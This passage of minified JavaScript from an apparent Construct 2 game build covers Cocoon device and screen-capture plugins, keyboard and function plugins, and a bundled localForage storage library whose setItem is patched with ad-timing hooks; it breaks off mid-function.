            if (this.runtime.isCocoonJs) {
                var s = ["APP_STORAGE", "INTERNAL_STORAGE", "EXTERNAL_STORAGE", "TEMPORARY_STORAGE"][i];
                Cocoon.Utils.captureScreenAsync(e, s, n, !1, (function (e, i) {
                    i ? t.runtime.trigger(cr.plugins_.Cocoon_Canvasplus.prototype.cnds.onCaptureScreenAsyncFail, t) : (r = e, t.runtime.trigger(cr.plugins_.Cocoon_Canvasplus.prototype.cnds.onCaptureScreenAsyncSuccess, t))
                }))
            }
        }, h.prototype.captureScreenSyncShare = function (e, i, n, r) {
            if (this.runtime.isCocoonJs) {
                var s = ["APP_STORAGE", "INTERNAL_STORAGE", "EXTERNAL_STORAGE", "TEMPORARY_STORAGE"][i];
                url = Cocoon.Utils.captureScreen(e, s, n, !1), Cocoon.Share.share({
                    message: r,
                    image: url
                }, (function (e, i, n) {
                    i ? t.runtime.trigger(cr.plugins_.Cocoon_Canvasplus.prototype.cnds.onShareSyncComplete, t) : t.runtime.trigger(cr.plugins_.Cocoon_Canvasplus.prototype.cnds.onShareSyncFail, t)
                }))
            }
        }, h.prototype.showWebdialog = function (i) {
            (e = new Cocoon.Widget.WebDialog).show(i, (function () {
                t.runtime.trigger(cr.plugins_.Cocoon_Canvasplus.prototype.cnds.onWebdialogUserClose, t)
            }))
        }, h.prototype.closeWebdialog = function () {
            e.close()
        }, h.prototype.getDeviceInfo = function () {
            s = Cocoon.Device.getDeviceInfo()
        }, o.acts = new h, c.prototype.InputText = function (t) {
            t.set_string(i)
        }, c.prototype.CaptureScreenSync = function (t) {
            t.set_string(n)
        }, c.prototype.CaptureScreenAsync = function (t) {
            t.set_string(r)
        }, c.prototype.DeviceOS = function (t) {
            t.set_string(s.os)
        }, c.prototype.DeviceVersion = function (t) {
            t.set_string(s.version)
        }, c.prototype.DeviceDPI = function (t) {
            t.set_string(s.dpi)
        }, c.prototype.DeviceBrand = function (t) {
            t.set_string(s.brand)
        }, c.prototype.DeviceModel = function (t) {
            t.set_string(s.model)
        }, c.prototype.DevicePlatformId = function (t) {
            t.set_string(s.platformId)
        }, o.exps = new c
    }(), cr.plugins_.Function = function (t) {
        this.runtime = t
    },
    function () {
        var t = cr.plugins_.Function.prototype;
        t.Type = function (t) {
            this.plugin = t, this.runtime = t.runtime
        }, t.Type.prototype.onCreate = function () {}, t.Instance = function (t) {
            this.type = t, this.runtime = t.runtime
        };
        var e = t.Instance.prototype,
            i = [],
            n = -1;

        function r() {
            this.name = "", this.retVal = 0, this.params = []
        }

        function s() {
            return ++n === i.length && i.push(new r), i[n]
        }

        function o() {
            return n < 0 ? null : i[n]
        }

        function a() {
            n--
        }

        function h() {}

        function c() {}

        function l() {}
        e.onCreate = function () {
            "undefined" != typeof cr_is_preview;
            var t = this;
            window.c2_callFunction = function (e, i) {
                var n, r, o, h = s();
                if (h.name = e.toLowerCase(), h.retVal = 0, i)
                    for (h.params.length = i.length, n = 0, r = i.length; n < r; ++n) o = i[n], h.params[n] = "number" == typeof o || "string" == typeof o ? o : "boolean" == typeof o && o ? 1 : 0;
                else cr.clearArray(h.params);
                return t.runtime.trigger(cr.plugins_.Function.prototype.cnds.OnFunction, t, h.name), a(), h.retVal
            }
        }, h.prototype.OnFunction = function (t) {
            var e = o();
            return !!e && cr.equals_nocase(t, e.name)
        }, h.prototype.CompareParam = function (t, e, i) {
            var n = o();
            return !!n && (!((t = cr.floor(t)) < 0 || t >= n.params.length) && cr.do_cmp(n.params[t], e, i))
        }, t.cnds = new h, c.prototype.CallFunction = function (t, e) {
            var i = s();
            i.name = t.toLowerCase(), i.retVal = 0, cr.shallowAssignArray(i.params, e);
            this.runtime.trigger(cr.plugins_.Function.prototype.cnds.OnFunction, this, i.name);
            a()
        }, c.prototype.SetReturnValue = function (t) {
            var e = o();
            e && (e.retVal = t)
        }, c.prototype.CallExpression = function (t) {}, t.acts = new c, l.prototype.ReturnValue = function (t) {
            var e = function () {
                if (!i.length) return null;
                var t = n + 1;
                return t >= i.length && (t = i.length - 1), i[t]
            }();
            e ? t.set_any(e.retVal) : t.set_int(0)
        }, l.prototype.ParamCount = function (t) {
            var e = o();
            e ? t.set_int(e.params.length) : t.set_int(0)
        }, l.prototype.Param = function (t, e) {
            e = cr.floor(e);
            var i = o();
            i && e >= 0 && e < i.params.length ? t.set_any(i.params[e]) : t.set_int(0)
        }, l.prototype.Call = function (t, e) {
            var i, n, r = s();
            for (r.name = e.toLowerCase(), r.retVal = 0, cr.clearArray(r.params), i = 2, n = arguments.length; i < n; i++) r.params.push(arguments[i]);
            this.runtime.trigger(cr.plugins_.Function.prototype.cnds.OnFunction, this, r.name);
            a(), t.set_any(r.retVal)
        }, t.exps = new l
    }(), cr.plugins_.Keyboard = function (t) {
        this.runtime = t
    },
    function () {
        var t = cr.plugins_.Keyboard.prototype;
        t.Type = function (t) {
            this.plugin = t, this.runtime = t.runtime
        }, t.Type.prototype.onCreate = function () {}, t.Instance = function (t) {
            this.type = t, this.runtime = t.runtime, this.keyMap = new Array(256), this.usedKeys = new Array(256), this.triggerKey = 0
        };
        var e = t.Instance.prototype;
        e.onCreate = function () {
            var t = this;
            this.runtime.isDomFree || (jQuery(document).keydown((function (e) {
                t.onKeyDown(e)
            })), jQuery(document).keyup((function (e) {
                t.onKeyUp(e)
            })))
        };
        var i = [32, 33, 34, 35, 36, 37, 38, 39, 40, 44];

        function n() {}

        function r() {}
        e.onKeyDown = function (t) {
            var e = !1;
            if (window != window.top && i.indexOf(t.which) > -1 && (t.preventDefault(), e = !0, t.stopPropagation()), this.keyMap[t.which]) this.usedKeys[t.which] && !e && t.preventDefault();
            else {
                this.keyMap[t.which] = !0, this.triggerKey = t.which, this.runtime.isInUserInputEvent = !0, this.runtime.trigger(cr.plugins_.Keyboard.prototype.cnds.OnAnyKey, this);
                var n = this.runtime.trigger(cr.plugins_.Keyboard.prototype.cnds.OnKey, this),
                    r = this.runtime.trigger(cr.plugins_.Keyboard.prototype.cnds.OnKeyCode, this);
                this.runtime.isInUserInputEvent = !1, (n || r) && (this.usedKeys[t.which] = !0, e || t.preventDefault())
            }
        }, e.onKeyUp = function (t) {
            this.keyMap[t.which] = !1, this.triggerKey = t.which, this.runtime.isInUserInputEvent = !0, this.runtime.trigger(cr.plugins_.Keyboard.prototype.cnds.OnAnyKeyReleased, this);
            var e = this.runtime.trigger(cr.plugins_.Keyboard.prototype.cnds.OnKeyReleased, this),
                i = this.runtime.trigger(cr.plugins_.Keyboard.prototype.cnds.OnKeyCodeReleased, this);
            this.runtime.isInUserInputEvent = !1, (e || i || this.usedKeys[t.which]) && (this.usedKeys[t.which] = !0, t.preventDefault())
        }, e.onWindowBlur = function () {
            var t;
            for (t = 0; t < 256; ++t)
                if (this.keyMap[t]) {
                    this.keyMap[t] = !1, this.triggerKey = t, this.runtime.trigger(cr.plugins_.Keyboard.prototype.cnds.OnAnyKeyReleased, this);
                    var e = this.runtime.trigger(cr.plugins_.Keyboard.prototype.cnds.OnKeyReleased, this),
                        i = this.runtime.trigger(cr.plugins_.Keyboard.prototype.cnds.OnKeyCodeReleased, this);
                    (e || i) && (this.usedKeys[t] = !0)
                }
        }, e.saveToJSON = function () {
            return {
                triggerKey: this.triggerKey
            }
        }, e.loadFromJSON = function (t) {
            this.triggerKey = t.triggerKey
        }, n.prototype.IsKeyDown = function (t) {
            return this.keyMap[t]
        }, n.prototype.OnKey = function (t) {
            return t === this.triggerKey
        }, n.prototype.OnAnyKey = function (t) {
            return !0
        }, n.prototype.OnAnyKeyReleased = function (t) {
            return !0
        }, n.prototype.OnKeyReleased = function (t) {
            return t === this.triggerKey
        }, n.prototype.IsKeyCodeDown = function (t) {
            return !((t = Math.floor(t)) < 0 || t >= this.keyMap.length) && this.keyMap[t]
        }, n.prototype.OnKeyCode = function (t) {
            return t === this.triggerKey
        }, n.prototype.OnKeyCodeReleased = function (t) {
            return t === this.triggerKey
        }, t.cnds = new n, t.acts = new function () {}, r.prototype.LastKeyCode = function (t) {
            t.set_int(this.triggerKey)
        }, r.prototype.StringFromKeyCode = function (t, e) {
            t.set_string(function (t) {
                switch (t = Math.floor(t)) {
                    case 8:
                        return "backspace";
                    case 9:
                        return "tab";
                    case 13:
                        return "enter";
                    case 16:
                        return "shift";
                    case 17:
                        return "control";
                    case 18:
                        return "alt";
                    case 19:
                        return "pause";
                    case 20:
                        return "capslock";
                    case 27:
                        return "esc";
                    case 33:
                        return "pageup";
                    case 34:
                        return "pagedown";
                    case 35:
                        return "end";
                    case 36:
                        return "home";
                    case 37:
                        return "←";
                    case 38:
                        return "↑";
                    case 39:
                        return "→";
                    case 40:
                        return "↓";
                    case 45:
                        return "insert";
                    case 46:
                        return "del";
                    case 91:
                        return "left window key";
                    case 92:
                        return "right window key";
                    case 93:
                        return "select";
                    case 96:
                        return "numpad 0";
                    case 97:
                        return "numpad 1";
                    case 98:
                        return "numpad 2";
                    case 99:
                        return "numpad 3";
                    case 100:
                        return "numpad 4";
                    case 101:
                        return "numpad 5";
                    case 102:
                        return "numpad 6";
                    case 103:
                        return "numpad 7";
                    case 104:
                        return "numpad 8";
                    case 105:
                        return "numpad 9";
                    case 106:
                        return "numpad *";
                    case 107:
                        return "numpad +";
                    case 109:
                        return "numpad -";
                    case 110:
                        return "numpad .";
                    case 111:
                        return "numpad /";
                    case 112:
                        return "F1";
                    case 113:
                        return "F2";
                    case 114:
                        return "F3";
                    case 115:
                        return "F4";
                    case 116:
                        return "F5";
                    case 117:
                        return "F6";
                    case 118:
                        return "F7";
                    case 119:
                        return "F8";
                    case 120:
                        return "F9";
                    case 121:
                        return "F10";
                    case 122:
                        return "F11";
                    case 123:
                        return "F12";
                    case 144:
                        return "numlock";
                    case 145:
                        return "scroll lock";
                    case 186:
                        return ";";
                    case 187:
                        return "=";
                    case 188:
                        return ",";
                    case 189:
                        return "-";
                    case 190:
                        return ".";
                    case 191:
                        return "/";
                    case 192:
                        return "'";
                    case 219:
                        return "[";
                    case 220:
                        return "\\";
                    case 221:
                        return "]";
                    case 222:
                        return "#";
                    case 223:
                        return "`";
                    default:
                        return String.fromCharCode(t)
                }
            }(e))
        }, t.exps = new r
    }();
var localForageInitFailed = !1;
try {
    /*!

        localForage -- Offline Storage, Improved

        Version 1.4.0

        https://mozilla.github.io/localForage

        (c) 2013-2015 Mozilla, Apache License 2.0

    */
    ! function () {
        var t, e, i, n, r;
        n = {}, r = {}, t = function (t, e, i) {
            n[t] = {
                deps: e,
                callback: i
            }
        }, i = e = function (t) {
            function s(e) {
                if ("." !== e.charAt(0)) return e;
                for (var i = e.split("/"), n = t.split("/").slice(0, -1), r = 0, s = i.length; s > r; r++) {
                    var o = i[r];
                    if (".." === o) n.pop();
                    else {
                        if ("." === o) continue;
                        n.push(o)
                    }
                }
                return n.join("/")
            }
            if (i._eak_seen = n, r[t]) return r[t];
            if (r[t] = {}, !n[t]) throw new Error("Could not find module " + t);
            for (var o, a = n[t], h = a.deps, c = a.callback, l = [], u = 0, p = h.length; p > u; u++) "exports" === h[u] ? l.push(o = {}) : l.push(e(s(h[u])));
            var d = c.apply(this, l);
            return r[t] = o || d
        }, t("promise/all", ["./utils", "exports"], (function (t, e) {
            "use strict";
            var i = t.isArray,
                n = t.isFunction;
            e.all = function (t) {
                if (!i(t)) throw new TypeError("You must pass an array to all.");
                return new this((function (e, i) {
                    function r(t) {
                        return function (e) {
                            s(t, e)
                        }
                    }

                    function s(t, i) {
                        a[t] = i, 0 == --h && e(a)
                    }
                    var o, a = [],
                        h = t.length;
                    0 === h && e([]);
                    for (var c = 0; c < t.length; c++)(o = t[c]) && n(o.then) ? o.then(r(c), i) : s(c, o)
                }))
            }
        })), t("promise/asap", ["exports"], (function (t) {
            "use strict";

            function e() {
                for (var t = 0; t < o.length; t++) {
                    var e = o[t];
                    (0, e[0])(e[1])
                }
                o = []
            }
            var i, n = "undefined" != typeof window ? window : {},
                r = n.MutationObserver || n.WebKitMutationObserver,
                s = "undefined" != typeof global ? global : void 0 === this ? window : this,
                o = [];
            i = "undefined" != typeof process && "[object process]" === {}.toString.call(process) ? function () {
                process.nextTick(e)
            } : r ? function () {
                var t = 0,
                    i = new r(e),
                    n = document.createTextNode("");
                return i.observe(n, {
                        characterData: !0
                    }),
                    function () {
                        n.data = t = ++t % 2
                    }
            }() : function () {
                s.setTimeout(e, 1)
            }, t.asap = function (t, e) {
                1 === o.push([t, e]) && i()
            }
        })), t("promise/config", ["exports"], (function (t) {
            "use strict";
            var e = {
                instrument: !1
            };
            t.config = e, t.configure = function (t, i) {
                return 2 !== arguments.length ? e[t] : void(e[t] = i)
            }
        })), t("promise/polyfill", ["./promise", "./utils", "exports"], (function (t, e, i) {
            "use strict";
            var n = t.Promise,
                r = e.isFunction;
            i.polyfill = function () {
                var t;
                "Promise" in (t = "undefined" != typeof global ? global : "undefined" != typeof window && window.document ? window : self) && "resolve" in t.Promise && "reject" in t.Promise && "all" in t.Promise && "race" in t.Promise && function () {
                    var e;
                    return new t.Promise((function (t) {
                        e = t
                    })), r(e)
                }() || (t.Promise = n)
            }
        })), t("promise/promise", ["./config", "./utils", "./all", "./race", "./resolve", "./reject", "./asap", "exports"], (function (t, e, i, n, r, s, o, a) {
            "use strict";

            function h(t) {
                if (!b(t)) throw new TypeError("You must pass a resolver function as the first argument to the promise constructor");
                if (!(this instanceof h)) throw new TypeError("Failed to construct 'Promise': Please use the 'new' operator, this object constructor cannot be called as a function.");
                this._subscribers = [],
                    function (t, e) {
                        function i(t) {
                            d(e, t)
                        }

                        function n(t) {
                            m(e, t)
                        }
                        try {
                            t(i, n)
                        } catch (t) {
                            n(t)
                        }
                    }(t, this)
            }

            function c(t, e, i, n) {
                var r, s, o, a, h = b(i);
                if (h) try {
                    r = i(n), o = !0
                } catch (t) {
                    a = !0, s = t
                } else r = n, o = !0;
                p(e, r) || (h && o ? d(e, r) : a ? m(e, s) : t === k ? d(e, r) : t === P && m(e, r))
            }

            function l(t, e, i, n) {
                var r = t._subscribers,
                    s = r.length;
                r[s] = e, r[s + k] = i, r[s + P] = n
            }

            function u(t, e) {
                for (var i = t._subscribers, n = t._detail, r = 0; r < i.length; r += 3) c(e, i[r], i[r + e], n);
                t._subscribers = null
            }

            function p(t, e) {
                var i, n = null;
                try {
                    if (t === e) throw new TypeError("A promises callback cannot return that same promise.");
                    if (v(e) && (n = e.then, b(n))) return n.call(e, (function (n) {
                        return !!i || (i = !0, void(e !== n ? d(t, n) : f(t, n)))
                    }), (function (e) {
                        return !!i || (i = !0, void m(t, e))
                    })), !0
                } catch (e) {
                    return i || m(t, e), !0
                }
                return !1
            }

            function d(t, e) {
                t === e ? f(t, e) : p(t, e) || f(t, e)
            }

            function f(t, e) {
                t._state === A && (t._state = O, t._detail = e, _.async(g, t))
            }

            function m(t, e) {
                t._state === A && (t._state = O, t._detail = e, _.async(y, t))
            }

            function g(t) {
                u(t, t._state = k)
            }

            function y(t) {
                u(t, t._state = P)
            }
            var _ = t.config,
                v = (t.configure, e.objectOrFunction),
                b = e.isFunction,
                w = (e.now, i.all),
                x = n.race,
                S = r.resolve,
                T = s.reject,
                C = o.asap;
            _.async = C;
            var A = void 0,
                O = 0,
                k = 1,
                P = 2;
            h.prototype = {
                constructor: h,
                _state: void 0,
                _detail: void 0,
                _subscribers: void 0,
                then: function (t, e) {
                    var i = this,
                        n = new this.constructor((function () {}));
                    if (this._state) {
                        var r = arguments;
                        _.async((function () {
                            c(i._state, n, r[i._state - 1], i._detail)
                        }))
                    } else l(this, n, t, e);
                    return n
                },
                catch: function (t) {
                    return this.then(null, t)
                }
            }, h.all = w, h.race = x, h.resolve = S, h.reject = T, a.Promise = h
        })), t("promise/race", ["./utils", "exports"], (function (t, e) {
            "use strict";
            var i = t.isArray;
            e.race = function (t) {
                if (!i(t)) throw new TypeError("You must pass an array to race.");
                return new this((function (e, i) {
                    for (var n, r = 0; r < t.length; r++)(n = t[r]) && "function" == typeof n.then ? n.then(e, i) : e(n)
                }))
            }
        })), t("promise/reject", ["exports"], (function (t) {
            "use strict";
            t.reject = function (t) {
                return new this((function (e, i) {
                    i(t)
                }))
            }
        })), t("promise/resolve", ["exports"], (function (t) {
            "use strict";
            t.resolve = function (t) {
                return t && "object" == typeof t && t.constructor === this ? t : new this((function (e) {
                    e(t)
                }))
            }
        })), t("promise/utils", ["exports"], (function (t) {
            "use strict";

            function e(t) {
                return "function" == typeof t
            }
            var i = Date.now || function () {
                return (new Date).getTime()
            };
            t.objectOrFunction = function (t) {
                return e(t) || "object" == typeof t && null !== t
            }, t.isFunction = e, t.isArray = function (t) {
                return "[object Array]" === Object.prototype.toString.call(t)
            }, t.now = i
        })), e("promise/polyfill").polyfill()
    }(),
    function (t, e) {
        "object" == typeof exports && "object" == typeof module ? module.exports = e() : "function" == typeof define && define.amd ? define([], e) : "object" == typeof exports ? exports.localforage = e() : t.localforage = e()
    }(this, (function () {
        return function (t) {
            function e(n) {
                if (i[n]) return i[n].exports;
                var r = i[n] = {
                    exports: {},
                    id: n,
                    loaded: !1
                };
                return t[n].call(r.exports, r, r.exports, e), r.loaded = !0, r.exports
            }
            var i = {};
            return e.m = t, e.c = i, e.p = "", e(0)
        }([function (t, e, i) {
            "use strict";
            e.__esModule = !0;
            var n = function (t) {
                function e(t, e) {
                    t[e] = function () {
                        var i = arguments;
                        return t.ready().then((function () {
                            return t[e].apply(t, i)
                        }))
                    }
                }

                function n() {
                    for (var t = 1; t < arguments.length; t++) {
                        var e = arguments[t];
                        if (e)
                            for (var i in e) e.hasOwnProperty(i) && (u(e[i]) ? arguments[0][i] = e[i].slice() : arguments[0][i] = e[i])
                    }
                    return arguments[0]
                }

                function r(t) {
                    for (var e in o)
                        if (o.hasOwnProperty(e) && o[e] === t) return !0;
                    return !1
                }
                var s = {},
                    o = {
                        INDEXEDDB: "asyncStorage",
                        LOCALSTORAGE: "localStorageWrapper",
                        WEBSQL: "webSQLStorage"
                    },
                    a = [o.INDEXEDDB, o.WEBSQL, o.LOCALSTORAGE],
                    h = ["clear", "getItem", "iterate", "key", "keys", "length", "removeItem", "setItem"],
                    c = {
                        description: "",
                        driver: a.slice(),
                        name: "localforage",
                        size: 4980736,
                        storeName: "keyvaluepairs",
                        version: 1
                    },
                    l = function (t) {
                        var e = {};
                        return e[o.INDEXEDDB] = !! function () {
                            try {
                                var e = e || t.indexedDB || t.webkitIndexedDB || t.mozIndexedDB || t.OIndexedDB || t.msIndexedDB;
                                return !(void 0 !== t.openDatabase && t.navigator && t.navigator.userAgent && /Safari/.test(t.navigator.userAgent) && !/Chrome/.test(t.navigator.userAgent)) && (e && "function" == typeof e.open && void 0 !== t.IDBKeyRange)
                            } catch (t) {
                                return !1
                            }
                        }(), e[o.WEBSQL] = !! function () {
                            try {
                                return t.openDatabase
                            } catch (t) {
                                return !1
                            }
                        }(), e[o.LOCALSTORAGE] = !! function () {
                            try {
                                return t.localStorage && "setItem" in t.localStorage && t.localStorage.setItem
                            } catch (t) {
                                return !1
                            }
                        }(), e
                    }(t),
                    u = Array.isArray || function (t) {
                        return "[object Array]" === Object.prototype.toString.call(t)
                    };
                return new(function () {
                    function t(e) {
                        (function (t, e) {
                            if (!(t instanceof e)) throw new TypeError("Cannot call a class as a function")
                        })(this, t), this.INDEXEDDB = o.INDEXEDDB, this.LOCALSTORAGE = o.LOCALSTORAGE, this.WEBSQL = o.WEBSQL, this._defaultConfig = n({}, c), this._config = n({}, this._defaultConfig, e), this._driverSet = null, this._initDriver = null, this._ready = !1, this._dbInfo = null, this._wrapLibraryMethodsWithReady(), this.setDriver(this._config.driver)
                    }
                    return t.prototype.config = function (t) {
                        if ("object" == typeof t) {
                            if (this._ready) return new Error("Can't call config() after localforage has been used.");
                            for (var e in t) "storeName" === e && (t[e] = t[e].replace(/\W/g, "_")), this._config[e] = t[e];
                            return "driver" in t && t.driver && this.setDriver(this._config.driver), !0
                        }
                        return "string" == typeof t ? this._config[t] : this._config
                    }, t.prototype.defineDriver = function (t, e, i) {
                        var n = new Promise((function (e, i) {
                            try {
                                var n = t._driver,
                                    o = new Error("Custom driver not compliant; see https://mozilla.github.io/localForage/#definedriver"),
                                    a = new Error("Custom driver name already in use: " + t._driver);
                                if (!t._driver) return void i(o);
                                if (r(t._driver)) return void i(a);
                                for (var c = h.concat("_initStorage"), u = 0; u < c.length; u++) {
                                    var p = c[u];
                                    if (!p || !t[p] || "function" != typeof t[p]) return void i(o)
                                }
                                var d = Promise.resolve(!0);
                                "_support" in t && (d = t._support && "function" == typeof t._support ? t._support() : Promise.resolve(!!t._support)), d.then((function (i) {
                                    l[n] = i, s[n] = t, e()
                                }), i)
                            } catch (t) {
                                i(t)
                            }
                        }));
                        return n.then(e, i), n
                    }, t.prototype.driver = function () {
                        return this._driver || null
                    }, t.prototype.getDriver = function (t, e, n) {
                        var o = this,
                            a = function () {
                                if (r(t)) switch (t) {
                                    case o.INDEXEDDB:
                                        return new Promise((function (t, e) {
                                            t(i(1))
                                        }));
                                    case o.LOCALSTORAGE:
                                        return new Promise((function (t, e) {
                                            t(i(2))
                                        }));
                                    case o.WEBSQL:
                                        return new Promise((function (t, e) {
                                            t(i(4))
                                        }))
                                } else if (s[t]) return Promise.resolve(s[t]);
                                return Promise.reject(new Error("Driver not found."))
                            }();
                        return a.then(e, n), a
                    }, t.prototype.getSerializer = function (t) {
                        var e = new Promise((function (t, e) {
                            t(i(3))
                        }));
                        return t && "function" == typeof t && e.then((function (e) {
                            t(e)
                        })), e
                    }, t.prototype.ready = function (t) {
                        var e = this,
                            i = e._driverSet.then((function () {
                                return null === e._ready && (e._ready = e._initDriver()), e._ready
                            }));
                        return i.then(t, t), i
                    }, t.prototype.setDriver = function (t, e, i) {
                        function n() {
                            r._config.driver = r.driver()
                        }
                        var r = this;
                        u(t) || (t = [t]);
                        var s = this._getSupportedDrivers(t),
                            o = null !== this._driverSet ? this._driverSet.catch((function () {
                                return Promise.resolve()
                            })) : Promise.resolve();
                        return this._driverSet = o.then((function () {
                            var t = s[0];
                            return r._dbInfo = null, r._ready = null, r.getDriver(t).then((function (t) {
                                r._driver = t._driver, n(), r._wrapLibraryMethodsWithReady(), r._initDriver = function (t) {
                                    return function () {
                                        var e = 0;
                                        return function i() {
                                            for (; e < t.length;) {
                                                var s = t[e];
                                                return e++, r._dbInfo = null, r._ready = null, r.getDriver(s).then((function (t) {
                                                    return r._extend(t), n(), r._ready = r._initStorage(r._config), r._ready
                                                })).catch(i)
                                            }
                                            n();
                                            var o = new Error("No available storage method found.");
                                            return r._driverSet = Promise.reject(o), r._driverSet
                                        }()
                                    }
                                }(s)
                            }))
                        })).catch((function () {
                            n();
                            var t = new Error("No available storage method found.");
                            return r._driverSet = Promise.reject(t), r._driverSet
                        })), this._driverSet.then(e, i), this._driverSet
                    }, t.prototype.supports = function (t) {
                        return !!l[t]
                    }, t.prototype._extend = function (t) {
                        n(this, t)
                    }, t.prototype._getSupportedDrivers = function (t) {
                        for (var e = [], i = 0, n = t.length; n > i; i++) {
                            var r = t[i];
                            this.supports(r) && e.push(r)
                        }
                        return e
                    }, t.prototype._wrapLibraryMethodsWithReady = function () {
                        for (var t = 0; t < h.length; t++) e(this, h[t])
                    }, t.prototype.createInstance = function (e) {
                        return new t(e)
                    }, t
                }())
            }("undefined" != typeof window ? window : self);
            e.default = n, t.exports = e.default
        }, function (t, e) {
            "use strict";
            e.__esModule = !0;
            var i = function (t) {
                function e(e, i) {
                    e = e || [], i = i || {};
                    try {
                        return new Blob(e, i)
                    } catch (s) {
                        if ("TypeError" !== s.name) throw s;
                        for (var n = new(t.BlobBuilder || t.MSBlobBuilder || t.MozBlobBuilder || t.WebKitBlobBuilder), r = 0; r < e.length; r += 1) n.append(e[r]);
                        return n.getBlob(i.type)
                    }
                }

                function i(t) {
                    return new Promise((function (i, n) {
                        var r = e([""], {
                                type: "image/png"
                            }),
                            s = t.transaction([d], "readwrite");
                        s.objectStore(d).put(r, "key"), s.oncomplete = function () {
                            var e = t.transaction([d], "readwrite").objectStore(d).get("key");
                            e.onerror = n, e.onsuccess = function (t) {
                                var e = t.target.result,
                                    n = URL.createObjectURL(e);
                                (function (t) {
                                    return new Promise((function (e, i) {
                                        var n = new XMLHttpRequest;
                                        n.open("GET", t), n.withCredentials = !0, n.responseType = "arraybuffer", n.onreadystatechange = function () {
                                            return 4 === n.readyState ? 200 === n.status ? e({
                                                response: n.response,
                                                type: n.getResponseHeader("Content-Type")
                                            }) : void i({
                                                status: n.status,
                                                response: n.response
                                            }) : void 0
                                        }, n.send()
                                    }))
                                })(n).then((function (t) {
                                    i(!(!t || "image/png" !== t.type))
                                }), (function () {
                                    i(!1)
                                })).then((function () {
                                    URL.revokeObjectURL(n)
                                }))
                            }
                        }, s.onerror = s.onabort = n
                    })).catch((function () {
                        return !1
                    }))
                }

                function n(t) {
                    return "boolean" == typeof u ? Promise.resolve(u) : i(t).then((function (t) {
                        return u = t
                    }))
                }

                function r(t) {
                    return e([function (t) {
                        for (var e = t.length, i = new ArrayBuffer(e), n = new Uint8Array(i), r = 0; e > r; r++) n[r] = t.charCodeAt(r);
                        return i
                    }(atob(t.data))], {
                        type: t.type
                    })
                }

                function s(t) {
                    return t && t.__local_forage_encoded_blob
                }

                function o(t) {
                    var e = this,
                        i = e._initReady().then((function () {
                            var t = p[e._dbInfo.name];
                            return t && t.dbReady ? t.dbReady : void 0
                        }));
                    return i.then(t, t), i
                }

                function a(e, i) {
                    return new Promise((function (n, r) {
                        if (e.db) {
                            if (!i) return n(e.db);
                            (function (t) {
                                var e = p[t.name],
                                    i = {};
                                i.promise = new Promise((function (t) {
                                    i.resolve = t
                                })), e.deferredOperations.push(i), e.dbReady ? e.dbReady = e.dbReady.then((function () {
                                    return i.promise
                                })) : e.dbReady = i.promise
                            })(e), e.db.close()
                        }
                        var s = [e.name];
                        i && s.push(e.version);
                        var o = l.open.apply(l, s);
                        i && (o.onupgradeneeded = function (i) {
                            var n = o.result;
                            try {
                                n.createObjectStore(e.storeName), i.oldVersion <= 1 && n.createObjectStore(d)
                            } catch (n) {
                                if ("ConstraintError" !== n.name) throw n;
                                t.console.warn('The database "' + e.name + '" has been upgraded from version ' + i.oldVersion + " to version " + i.newVersion + ', but the storage "' + e.storeName + '" already exists.')
                            }
                        }), o.onerror = function () {
                            r(o.error)
                        }, o.onsuccess = function () {
                            n(o.result),
                                function (t) {
                                    var e = p[t.name].deferredOperations.pop();
                                    e && e.resolve()
                                }(e)
                        }
                    }))
                }

                function h(e, i) {
                    if (!e.db) return !0;
                    var n = !e.db.objectStoreNames.contains(e.storeName),
                        r = e.version < e.db.version,
                        s = e.version > e.db.version;
                    if (r && (e.version !== i && t.console.warn('The database "' + e.name + "\" can't be downgraded from version " + e.db.version + " to version " + e.version + "."), e.version = e.db.version), s || n) {
                        if (n) {
                            var o = e.db.version + 1;
                            o > e.version && (e.version = o)
                        }
                        return !0
                    }
                    return !1
                }

                function c(t, e) {
                    e && t.then((function (t) {
                        e(null, t)
                    }), (function (t) {
                        e(t)
                    }))
                }
                var l = l || t.indexedDB || t.webkitIndexedDB || t.mozIndexedDB || t.OIndexedDB || t.msIndexedDB;
                if (l) {
                    var u, p, d = "local-forage-detect-blob-support";
                    return {
                        _driver: "asyncStorage",
                        _initStorage: function (t) {
                            function e() {
                                return Promise.resolve()
                            }
                            var i = this,
                                n = {
                                    db: null
                                };
                            if (t)
                                for (var r in t) n[r] = t[r];
                            p || (p = {});
                            var s = p[n.name];
                            s || (s = {
                                forages: [],
                                db: null,
                                dbReady: null,
                                deferredOperations: []
                            }, p[n.name] = s), s.forages.push(i), i._initReady || (i._initReady = i.ready, i.ready = o);
                            for (var c = [], l = 0; l < s.forages.length; l++) {
                                var u = s.forages[l];
                                u !== i && c.push(u._initReady().catch(e))
                            }
                            var d = s.forages.slice(0);
                            return Promise.all(c).then((function () {
                                return n.db = s.db,
                                    function (t) {
                                        return a(t, !1)
                                    }(n)
                            })).then((function (t) {
                                return n.db = t, h(n, i._defaultConfig.version) ? function (t) {
                                    return a(t, !0)
                                }(n) : t
                            })).then((function (t) {
                                n.db = s.db = t, i._dbInfo = n;
                                for (var e = 0; e < d.length; e++) {
                                    var r = d[e];
                                    r !== i && (r._dbInfo.db = n.db, r._dbInfo.version = n.version)
                                }
                            }))
                        },
                        iterate: function (t, e) {
                            var i = this,
                                n = new Promise((function (e, n) {
                                    i.ready().then((function () {
                                        var o = i._dbInfo,
                                            a = o.db.transaction(o.storeName, "readonly").objectStore(o.storeName).openCursor(),
                                            h = 1;
                                        a.onsuccess = function () {
                                            var i = a.result;
                                            if (i) {
                                                var n = i.value;
                                                s(n) && (n = r(n));
                                                var o = t(n, i.key, h++);
                                                void 0 !== o ? e(o) : i.continue()
                                            } else e()
                                        }, a.onerror = function () {
                                            n(a.error)
                                        }
                                    })).catch(n)
                                }));
                            return c(n, e), n
                        },
                        getItem: function (e, i) {
                            var n = this;
                            "string" != typeof e && (t.console.warn(e + " used as a key, but it is not a string."), e = String(e));
                            var o = new Promise((function (t, i) {
                                n.ready().then((function () {
                                    var o = n._dbInfo,
                                        a = o.db.transaction(o.storeName, "readonly").objectStore(o.storeName).get(e);
                                    a.onsuccess = function () {
                                        var e = a.result;
                                        void 0 === e && (e = null), s(e) && (e = r(e)), t(e)
                                    }, a.onerror = function () {
                                        i(a.error)
                                    }
                                })).catch(i)
                            }));
                            return c(o, i), o
                        },
                        setItem: function (e, i, r) {
                            console.log(666666666,e);
                            if (e.indexOf('totPlay')>=0)
                            {
                                adManager.inPlaying = true;
                                adManager.lastStartTime = new Date().getTime();
                            }
							if(e.indexOf('highscore')>=0 && adManager.inPlaying)
							{
							    let curTime = new Date().getTime();
